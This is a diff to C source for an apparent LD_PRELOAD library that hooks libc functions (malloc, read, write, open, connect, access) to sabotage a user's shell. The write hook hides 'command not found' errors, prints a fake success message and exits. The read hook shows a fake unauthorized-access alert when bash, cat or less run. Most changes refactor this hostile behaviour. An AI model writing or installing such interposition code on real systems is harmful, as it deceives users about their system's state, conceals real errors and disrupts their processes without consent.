@@ -10,16 +10,15 @@
 #include <fcntl.h>
 #include <stdarg.h>
 #include <errno.h>
-#include <sys/stat.h>
 #include <libgen.h>
 #include <limits.h>
 #include <sys/types.h> // For PATH_MAX
 #include <sys/socket.h> // for connect
+#include <sys/stat.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <math.h>
-#include <unistd.h>
 #include <ctype.h> // for getchar
 
 
@@ -30,13 +29,22 @@ int (*original_open)(const char *pathname, int flags, ...) = NULL;
 static int (*connect_connect)(int, const struct sockaddr *, socklen_t) = NULL;
 int (*original_getchar)(void) =NULL;
 
+static int block_count = 0; // Global counter for blocked connections
+
+
 
 // ####### MALLOC #######
 long get_random_uint() {
     long r;
     long fd = open("/dev/urandom", O_RDONLY);
-    read(fd, &r, sizeof(r));
-    close(fd);
+    if (fd >= 0) {
+        if (read(fd, &r, sizeof(r)) < 0) {
+            r = 42; //fallback value
+        }
+        close(fd);
+    } else {
+        r = 42; // fallback value
+    }
 
     if (r < 0) {
         r = r * (-1);
@@ -54,8 +62,19 @@ static void mtrace_init(void)
     }
 }
 
-void *malloc(size_t size)
-{
+void *malloc(size_t size) {
+    pid_t pid = getpid();
+    char exe_path[512];
+    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
+    char exe[512];
+    ssize_t len = readlink(exe_path, exe, sizeof(exe) - 1);
+    if (len != -1) {
+        exe[len] = '\0';
+        if (!strstr(exe, "bash") && !strstr(exe, "less") && !strstr(exe, "cat")) {
+            return original_malloc(size); // Avoid collision with read() 
+    }
+}
+
     long random;
     if(original_malloc==NULL) { //if original malloc doesnt exist call it
         mtrace_init();
@@ -72,8 +91,6 @@ void *malloc(size_t size)
     }
     return p;
 }
-
-static int block_count = 0; // Global counter for blocked connections
 
 
 // Override access() to pretend command-not-found doesn't exist
@@ -124,10 +141,11 @@ ssize_t read(int fd, void *buf, size_t count) {
 
         char exe[512];
         ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
-        if (len != -1) {
+        if (len != -1 && len < sizeof(exe)) {
             exe[len] = '\0';
+            char *name = basename(exe);
 
-            if (strstr(exe, "bash") || strstr(exe, "cat") || strstr(exe, "less")) {
+            if (strstr(name, "bash") || strstr(name, "cat") || strstr(name, "less")) {
                 fprintf(stderr, "\033[31mALERT: Unauthorized access detected\n");
                 sleep(2);
                 const char *home = getenv("HOME");
@@ -202,27 +220,25 @@ int open(const char *pathname, int flags, ...) {
 typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);
 
 ssize_t write(int fd, const void *buf, size_t count) {
+    if (!original_write){
+            original_write = dlsym(RTLD_NEXT, "write");
+}
+
     if (getenv("DISABLE_WRITE_PRANK")) {
-        if (!original_write)
-            original_write = (orig_write_f_type)dlsym(RTLD_NEXT, "write");
         return original_write(fd, buf, count);
     }
 
-    static orig_write_f_type orig_write = NULL;
-    if (!orig_write)
-        orig_write = (orig_write_f_type)dlsym(RTLD_NEXT, "write");
-
     char *msg = strndup(buf, count);
-    if (!msg) return orig_write(fd, buf, count);
+    if (!msg) return original_write(fd, buf, count);
 
     if ((strstr(msg, "Command") && strstr(msg, "not found")) || strstr(msg, "Could not find command-not-found")) {
         const char *success_msg = "Finished execution: no errors\n";
-        orig_write(fd, success_msg, strlen(success_msg));
+        original_write(fd, success_msg, strlen(success_msg));
         free(msg);
         exit(0);
     }
 
-    ssize_t result = orig_write(fd, msg, count);
+    ssize_t result = original_write(fd, msg, count);
     free(msg);
     return result;
 }
